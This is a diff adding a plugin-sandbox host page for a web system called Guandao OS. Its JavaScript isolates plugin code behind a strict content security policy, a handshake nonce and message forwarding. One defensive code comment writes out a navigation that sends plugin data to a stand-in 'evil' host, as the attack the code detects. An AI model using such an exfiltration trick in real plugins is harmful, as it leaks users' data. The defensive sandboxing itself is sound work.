@@ -1,0 +1,349 @@
+<!doctype html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="robots" content="noindex, nofollow" />
+    <title>Guandao Sandbox Host</title>
+    <style>
+      html,
+      body {
+        margin: 0;
+        padding: 0;
+        width: 100%;
+        height: 100%;
+        background: transparent;
+        overflow: hidden;
+        color-scheme: normal;
+      }
+      iframe {
+        display: block;
+        width: 100%;
+        height: 100%;
+        border: 0;
+        background: transparent;
+      }
+      #boot {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        height: 100%;
+        font: 12px/1.5 ui-sans-serif, system-ui, -apple-system, "Segoe UI", sans-serif;
+        color: #8a93a6;
+        letter-spacing: 0.02em;
+      }
+    </style>
+  </head>
+  <body>
+    <div id="boot">沙箱启动中…</div>
+    <script>
+      /*
+       * Guandao OS 1.7 · 插件沙箱运行器
+       *
+       * 这个文档只会以 sandbox="allow-scripts" 的方式被主页面加载，没有
+       * allow-same-origin，因此：
+       *   - document.origin 是 opaque（"null"），读不到 guandao.xin 的
+       *     Cookie / LocalStorage / DOM；
+       *   - 主页面也绝不能用 event.origin === "null" 判断身份，只认
+       *     event.source === iframe.contentWindow 与 MessagePort 本身。
+       *
+       * 插件代码再被放进一层同样 sandbox 的 srcdoc iframe，运行器只做三件事：
+       * 注入 SDK、转发结构化消息、在销毁时清空引用。
+       */
+      (function () {
+        "use strict";
+
+        var CHANNEL = "guandao.plugin.sandbox";
+        var PLUGIN_CHANNEL = "guandao.plugin";
+        var MAX_HTML = 2.6 * 1024 * 1024;
+        var MAX_SDK = 160 * 1024;
+        var MAX_RPC_BYTES = 64 * 1024;
+
+        /*
+         * 插件文档的策略：可以跑内联脚本与内联样式（插件本身就是一个文档），
+         * 但没有任何网络出口，也不允许表单提交、<base> 改写与外链样式。
+         * 这段策略同时通过 <meta> 写进插件文档、通过 csp 属性挂在 iframe 上，
+         * 不依赖 blob: 文档是否继承创建者的 CSP。
+         */
+        var PLUGIN_CSP = [
+          "default-src 'none'",
+          "script-src 'unsafe-inline'",
+          "style-src 'unsafe-inline'",
+          "img-src data: blob:",
+          "media-src data: blob:",
+          "font-src data:",
+          "connect-src 'none'",
+          "frame-src 'none'",
+          "base-uri 'none'",
+          "form-action 'none'",
+        ].join("; ");
+
+        var hostWindow = window.parent;
+        var port = null;
+        var mount = null;
+        var frame = null;
+        var boot = document.getElementById("boot");
+        var destroyed = false;
+
+        function postToHost(message) {
+          if (!port || destroyed) return;
+          try {
+            port.postMessage(message);
+          } catch (error) {
+            /* 端口已关闭 */
+          }
+        }
+
+        function fail(message) {
+          postToHost({ kind: "ERROR", message: String(message).slice(0, 400) });
+          if (boot) boot.textContent = "插件未能启动";
+        }
+
+        window.addEventListener("message", function (event) {
+          if (destroyed) return;
+          // MOUNT 只接受来自父窗口、且只接受一次
+          if (event.source !== hostWindow) return;
+          var data = event.data;
+          if (!data || typeof data !== "object" || data.channel !== CHANNEL) return;
+          if (data.kind === "MOUNT" && !mount) {
+            try {
+              start(data, event.ports && event.ports[0]);
+            } catch (error) {
+              fail(error && error.message ? error.message : "沙箱初始化失败");
+            }
+          }
+        });
+
+        function start(data, incomingPort) {
+          if (!incomingPort) throw new Error("缺少受控通信端口");
+          if (!data.pluginId || typeof data.pluginId !== "string") throw new Error("缺少插件标识");
+          /* 握手校验：MOUNT 必须带回运行器刚发出的 nonce。
+             这样即使 frame 被导航到别的文档（WindowProxy 身份不变），
+             新文档也无法拿到端口，因为它不知道 nonce。 */
+          if (!data.nonce || data.nonce !== helloNonce) throw new Error("沙箱握手校验失败");
+          var html = String(data.html || "");
+          var sdk = String(data.sdk || "");
+          if (!html) throw new Error("插件没有可运行的入口");
+          if (html.length > MAX_HTML) throw new Error("插件入口过大");
+          if (!sdk || sdk.length > MAX_SDK) throw new Error("SDK 预置脚本异常");
+
+          port = incomingPort;
+          port.onmessage = onPortMessage;
+          port.start && port.start();
+          mount = { pluginId: data.pluginId, mountId: String(data.mountId || "") };
+
+          if (boot && boot.parentNode) boot.parentNode.removeChild(boot);
+
+          frame = document.createElement("iframe");
+          frame.setAttribute("sandbox", "allow-scripts");
+          frame.setAttribute("referrerpolicy", "no-referrer");
+          frame.setAttribute("title", "Guandao Plugin Sandbox");
+          // 把 CSP 一并带到文档上：不依赖 blob: 是否继承创建者的策略
+          frame.setAttribute("csp", PLUGIN_CSP);
+          frame.style.cssText = "display:block;width:100%;height:100%;border:0;background:transparent";
+
+          var config = {
+            channel: PLUGIN_CHANNEL,
+            pluginId: mount.pluginId,
+            mountId: mount.mountId,
+            granted: Array.isArray(data.granted) ? data.granted : [],
+            theme: data.theme && typeof data.theme === "object" ? data.theme : {},
+            context: data.context && typeof data.context === "object" ? data.context : {},
+          };
+
+          var head = "<meta http-equiv=\"Content-Security-Policy\" content=\"" + PLUGIN_CSP + "\">";
+          head += "<script>window.__GUANDAO_PLUGIN__=" + safeJson(config) + ";</scr" + "ipt>";
+          var prelude = "<script>" + escapeScript(sdk) + "</scr" + "ipt>";
+          var documentText = inject(html, head + prelude);
+
+          // 用 Blob URL 而不是 srcdoc：srcdoc 在部分浏览器会被 frame-src 拦下，
+          // Blob 在当前 CSP 里是显式允许的，销毁时立刻 revoke。
+          var objectUrl = "";
+          try {
+            objectUrl = URL.createObjectURL(new Blob([documentText], { type: "text/html" }));
+          } catch (error) {
+            objectUrl = "";
+          }
+          if (objectUrl) {
+            frame.dataset.objectUrl = objectUrl;
+            frame.src = objectUrl;
+          } else {
+            frame.srcdoc = documentText;
+          }
+          var frameLoads = 0;
+          frame.addEventListener("load", function () {
+            frameLoads += 1;
+            if (frameLoads > 1) {
+              /* 1.9 安全加固：沙箱无法阻止插件把自己的 iframe 导航到外部地址
+                 （location.href = "https://evil/?d=..."），这是绕过 connect-src 'none'
+                 与网络权限的唯一已知通道。这里做确定性检测：插件文档只应加载一次，
+                 出现第二次 load 说明页面被导航，立刻终止并从宿主层面禁用该插件。 */
+              postToHost({
+                kind: "EVENT",
+                pluginId: mount.pluginId,
+                event: "sandbox:navigation",
+                payload: { blocked: true },
+              });
+              try {
+                if (frame.contentWindow) frame.contentWindow.location.replace("about:blank");
+              } catch (error) {
+                /* 跨域时无法操作，直接销毁即可 */
+              }
+              fail("插件试图跳出沙箱，已终止");
+              return;
+            }
+            postToHost({ kind: "READY", pluginId: mount.pluginId });
+          });
+          document.body.appendChild(frame);
+
+          frame.addEventListener("error", function () {
+            fail("插件页面加载失败");
+          });
+        }
+
+        function onPortMessage(event) {
+          var data = event.data;
+          if (!data || typeof data !== "object") return;
+          if (data.kind === "RESULT" && frame && frame.contentWindow) {
+            frame.contentWindow.postMessage(
+              {
+                channel: PLUGIN_CHANNEL,
+                kind: "RESULT",
+                requestId: String(data.requestId || ""),
+                ok: Boolean(data.ok),
+                result: data.result,
+                error: data.error,
+              },
+              "*",
+            );
+            return;
+          }
+          if (data.kind === "EVENT" && frame && frame.contentWindow) {
+            frame.contentWindow.postMessage(
+              {
+                channel: PLUGIN_CHANNEL,
+                kind: "EVENT",
+                event: String(data.event || ""),
+                payload: data.payload,
+              },
+              "*",
+            );
+            return;
+          }
+          if (data.kind === "DESTROY") {
+            teardown();
+          }
+        }
+
+        window.addEventListener("message", function (event) {
+          if (destroyed || !frame) return;
+          // 插件 → 宿主：只认运行器自己创建的那个 iframe
+          if (event.source !== frame.contentWindow) return;
+          var data = event.data;
+          if (!data || typeof data !== "object" || data.channel !== PLUGIN_CHANNEL) return;
+          if (data.kind !== "RPC") return;
+
+          var requestId = String(data.requestId || "");
+          var method = String(data.method || "");
+          if (!/^[a-zA-Z0-9_.:-]{1,64}$/.test(requestId)) return;
+          if (!/^[a-zA-Z0-9_.]{1,40}$/.test(method)) return;
+
+          var payload = data.payload;
+          if (payload !== undefined) {
+            var encoded;
+            try {
+              encoded = JSON.stringify(payload);
+            } catch (error) {
+              postToPluginError(requestId, "INVALID_PAYLOAD", "参数无法序列化");
+              return;
+            }
+            if (!encoded || encoded.length > MAX_RPC_BYTES) {
+              postToPluginError(requestId, "PAYLOAD_TOO_LARGE", "参数超过大小限制");
+              return;
+            }
+          }
+
+          // 身份不采信插件自报：pluginId 一律用 mount 时的值覆盖。
+          postToHost({
+            kind: "RPC",
+            pluginId: mount.pluginId,
+            requestId: requestId,
+            method: method,
+            payload: payload,
+          });
+        });
+
+        function postToPluginError(requestId, code, message) {
+          if (!frame || !frame.contentWindow) return;
+          frame.contentWindow.postMessage(
+            {
+              channel: PLUGIN_CHANNEL,
+              kind: "RESULT",
+              requestId: requestId,
+              ok: false,
+              error: { code: code, message: message },
+            },
+            "*",
+          );
+        }
+
+        function teardown() {
+          if (destroyed) return;
+          destroyed = true;
+          try {
+            if (port) {
+              port.onmessage = null;
+              port.close && port.close();
+            }
+          } catch (error) {
+            /* 忽略 */
+          }
+          if (frame) {
+            var objectUrl = frame.dataset.objectUrl;
+            if (objectUrl) {
+              try {
+                URL.revokeObjectURL(objectUrl);
+              } catch (error) {
+                /* 忽略 */
+              }
+            }
+            if (frame.parentNode) frame.parentNode.removeChild(frame);
+          }
+          frame = null;
+          port = null;
+          mount = null;
+        }
+
+        function inject(html, headInjection) {
+          var text = String(html);
+          // <base> / meta refresh 会改变相对路径或悄悄跳转，直接移除。
+          text = text.replace(/<base\b[^>]*>/gi, "");
+          text = text.replace(/<meta\b[^>]*http-equiv\s*=\s*["']?refresh["']?[^>]*>/gi, "");
+          if (/<head[^>]*>/i.test(text)) {
+            return text.replace(/<head([^>]*)>/i, function (all) {
+              return all + headInjection;
+            });
+          }
+          if (/<html[^>]*>/i.test(text)) {
+            return text.replace(/<html([^>]*)>/i, function (all) {
+              return all + "<head>" + headInjection + "</head>";
+            });
+          }
+          return "<!doctype html><html><head>" + headInjection + "</head><body>" + text + "</body></html>";
+        }
+
+        function escapeScript(source) {
+          return String(source).replace(/<\/script/gi, "<\\/script");
+        }
+
+        function safeJson(value) {
+          return JSON.stringify(value).replace(/</g, "\\u003c").replace(/>/g, "\\u003e");
+        }
+
+        // 通知宿主：运行器已就绪，可以建立 MessageChannel
+        var helloNonce = Math.random().toString(36).slice(2) + Date.now().toString(36);
+        hostWindow.postMessage({ channel: CHANNEL, kind: "HELLO", nonce: helloNonce }, "*");
+      })();
+    </script>
+  </body>
+</html>
